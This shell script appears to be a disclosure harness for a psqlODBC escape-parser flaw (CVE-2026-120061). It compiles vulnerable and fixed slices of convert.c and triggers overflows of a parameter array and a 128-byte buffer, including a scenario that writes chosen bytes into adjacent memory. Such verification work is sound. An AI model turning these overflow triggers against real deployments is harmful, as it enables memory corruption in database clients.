#!/bin/sh
# Direct-call harness for CVE-2026-120061 (psqlODBC ODBC escape parser).
# Verbatim slices of pinned convert.c from REL-18_00_0005 (vuln) and
# REL-18_00_0006 (fixed); #line preserves pinned source line numbers.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRC=$(CDPATH= cd -- "$HERE/../src" && pwd)
OUT="$HERE/evidence"
mkdir -p "$OUT"

extract() { # file first last out
    sed -n "$2,$3 p" "$1" > "$4"
}

gen_driver() { # variant
    v=$1
    cf="$SRC/convert.c.$v"
    extract "$cf" 2424 2436 "$HERE/slice-extract-$v.inc"
    if [ "$v" = vuln ]; then lo=5607; hi=5698; else lo=5607; hi=5710; fi
    extract "$cf" "$lo" "$hi" "$HERE/slice-params-$v.inc"
    cat > "$HERE/driver-$v.c" <<'HEADER'
/* Harness scaffolding only; the two #line blocks below are verbatim pinned
 * convert.c bytes. No psqlODBC process, ODBC driver manager, SQL text path,
 * socket or network is involved. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef unsigned char UCHAR;
typedef int BOOL;
typedef int RETCODE;
typedef long long SQLLEN;
typedef unsigned int UInt4;
#define SQL_SUCCESS 0
#define SQL_ERROR (-1)
#define STMT_EXEC_ERROR 1
#define ODBC_ESCAPE_START '{'
#define ODBC_ESCAPE_END '}'
#define IS_NOT_SPACE(c) ((c) != ' ' && (c) != '\t' && (c) != '\n' && (c) != '\r')
#define MYLOG(...) ((void)0)
#define MBCS_NON_ASCII(e) 0
#define TRUE 1
#define FALSE 0
#define QP_in_idle_status(q) 1

typedef struct { const char *statement; size_t stmt_len; size_t opos; int encstr; } QueryParse;
typedef struct {
    char *query_statement; size_t npos; size_t qbuf_len;
    int errornumber; const char *errormsg; void *stmt;
    int num_io_params; int proc_return; int param_number;
} QueryBuild;

#define F_OldChar(qp) ((qp)->statement[(qp)->opos])
#define F_OldPos(qp) ((qp)->opos)
#define F_OldNext(qp) (++(qp)->opos)
#define F_OldPrior(qp) (--(qp)->opos)
#define F_OldPtr(qp) ((qp)->statement + (qp)->opos)
#define F_NewPos(qb) ((qb)->npos)

static int inner_process_tokens(QueryParse *qp, QueryBuild *qb)
{
    char c = qp->statement[qp->opos];
    if (c == '\0') return SQL_ERROR;
    if (!c || qb->npos + 1 < qb->qbuf_len)
        qb->query_statement[qb->npos++] = c;
    else
        qb->npos++;
    /* caller's for-loop performs F_OldNext; leave opos on the current char */
    return SQL_SUCCESS;
}

#line 2424 "convert.c.VARIANT"
HEADER
    cat "$HERE/slice-extract-$v.inc" >> "$HERE/driver-$v.c"
    cat >> "$HERE/driver-$v.c" <<'MID'
#line 5607 "convert.c.VARIANT"
MID
    cat "$HERE/slice-params-$v.inc" >> "$HERE/driver-$v.c"
    if [ "$v" = fixed ]; then
      echo '#define PP_CALL(q,a,o,p) processParameters((q),(a),(o),(p),16)' >> "$HERE/driver-$v.c"
    else
      echo '#define PP_CALL(q,a,o,p) processParameters((q),(a),(o),(p))' >> "$HERE/driver-$v.c"
    fi
    cat >> "$HERE/driver-$v.c" <<'FOOTER'

/* ---------------- scenarios ---------------- */

static const char *make_args(int n)
{
    static char s[2048];
    int i;
    s[0] = '(';
    for (i = 1; i <= n; i++) {
        char part[8];
        int k = snprintf(part, sizeof part, "%sA", i > 1 ? "," : "");
        memcpy(s + strlen(s), part, (size_t) k);
    }
    strcat(s, ")}");
    return s;
}

static void run_fn_asan(void)
{
    const char *sql = make_args(24);
    char out[4096];
    QueryParse qp; QueryBuild qb;
    SQLLEN param_pos[16][2];
    size_t consumed = 999;
    int rv;
    qp.statement = sql; qp.stmt_len = strlen(sql); qp.opos = 0; qp.encstr = 0;
    qb.query_statement = out; qb.npos = 0; qb.qbuf_len = sizeof out;
    qb.errornumber = 0; qb.errormsg = NULL; qb.stmt = NULL;
    qb.num_io_params = 0; qb.proc_return = 0; qb.param_number = 0;
    rv = PP_CALL(&qp, &qb, &consumed, param_pos);
    printf("FN_ASAN RV=%d CONSUMED=%zu\n", rv, consumed);
    printf("FN_ASAN ERR=%s\n", qb.errormsg ? qb.errormsg : "-");
}

struct chosen_layout { SQLLEN pp[16][2]; unsigned char sink[512]; };

static void run_fn_chosen(void)
{
    const char *sql = make_args(24);
    char out[8192];
    QueryParse qp; QueryBuild qb;
    struct chosen_layout *L = (struct chosen_layout *) calloc(1, sizeof *L);
    size_t consumed = 999, i, n5a = 0;
    int rv, first = -1;
    memset(L->sink, 0xCC, sizeof L->sink);
    qp.statement = sql; qp.stmt_len = strlen(sql); qp.opos = 0; qp.encstr = 0;
    qb.query_statement = out; qb.npos = 0x5a5a5a5a5a5a5a00LL; qb.qbuf_len = sizeof out;
    qb.errornumber = 0; qb.errormsg = NULL; qb.stmt = NULL;
    qb.num_io_params = 0; qb.proc_return = 0; qb.param_number = 0;
    rv = PP_CALL(&qp, &qb, &consumed, L->pp);
    for (i = 0; i < sizeof L->sink; i++) {
        if (L->sink[i] == 0xCC) continue;
        if (first < 0) first = (int) i;
        if (L->sink[i] == 0x5a) n5a++;
    }
    printf("FN_CHOSEN RV=%d FIRST_DIFF=%d CHOSEN_5A=%zu\n", rv, first, n5a);
    printf("FN_CHOSEN SINK=");
    for (i = 0; i < 32 && i < sizeof L->sink; i++) printf("%02x", L->sink[i]);
    printf("\n");
    free(L);
}

static void run_extract_asan(void)
{
    char stmt[256];
    char buf_small[128];
    QueryParse qp;
    int retval = 0;
    memset(stmt, 'A', 200); stmt[200] = '}'; stmt[201] = '\0';
    qp.statement = stmt; qp.stmt_len = 201; qp.opos = 0; qp.encstr = 0;
    { QueryParse *qpp = &qp;
#line 2424 "convert.c.VARIANT"
      F_ExtractOldTo(qpp, buf_small, ODBC_ESCAPE_END, sizeof(buf_small));
    }
cleanup:
    printf("EXTRACT_ASAN RETVAL=%d BUF127=%02x\n", retval,
           (unsigned int)(unsigned char) buf_small[127]);
}

int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    const char *which = argc > 1 ? argv[1] : "fn";
    if (strcmp(which, "fn") == 0) run_fn_asan();
    else if (strcmp(which, "extract") == 0) run_extract_asan();
    else run_fn_chosen();
    return 0;
}
FOOTER
    # VARIANT placeholder must become the real pinned file name in #line.
    sed -i "s/convert\.c\.VARIANT/convert.c.$v/g" "$HERE/driver-$v.c"
}

build_and_run() { # cc san variant tag
    cc=$1; san=$2; v=$3; tag=$4
    flags="-O0 -g -fno-stack-protector"
    [ "$san" = asan ] && flags="$flags -fsanitize=address -fno-omit-frame-pointer"
    $cc $flags -o "$HERE/bin-$tag" "$HERE/driver-$v.c" 2> "$OUT/build-$tag.log"
    set +e
    if [ "$san" = asan ]; then
        "$HERE/bin-$tag" fn > "$OUT/run-$tag-fn.out" 2> "$OUT/run-$tag-fn.err"
        r1=$?
        "$HERE/bin-$tag" extract > "$OUT/run-$tag-extract.out" 2> "$OUT/run-$tag-extract.err"
        r2=$?
        rc="$r1/$r2"
    else
        "$HERE/bin-$tag" chosen > "$OUT/run-$tag.out" 2> "$OUT/run-$tag.err"
        rc=$?
    fi
    set -e
    printf '%s RC=%s\n' "$tag" "$rc"
    printf '%s RC=%s\n' "$tag" "$rc" >> "$OUT/rc.txt"
}

: > "$OUT/rc.txt"
gen_driver vuln
gen_driver fixed
for cc in gcc clang; do
    command -v "$cc" >/dev/null 2>&1 || continue
    for v in vuln fixed; do
        build_and_run "$cc" asan "$v" "$cc-$v-asan"
        build_and_run "$cc" plain "$v" "$cc-$v-plain"
    done
done

# Normalized trace: no PID, address or absolute path.
: > "$OUT/trace.txt"
for f in "$OUT"/run-*.out; do
    printf '%s ' "$(basename "$f" .out)" >> "$OUT/trace.txt"
    tr '\n' ' ' < "$f" >> "$OUT/trace.txt"
    printf '\n' >> "$OUT/trace.txt"
done
sha256sum "$OUT/trace.txt" | cut -d' ' -f1 > "$OUT/trace.sha256"
echo "TRACE $(cat "$OUT/trace.sha256")"
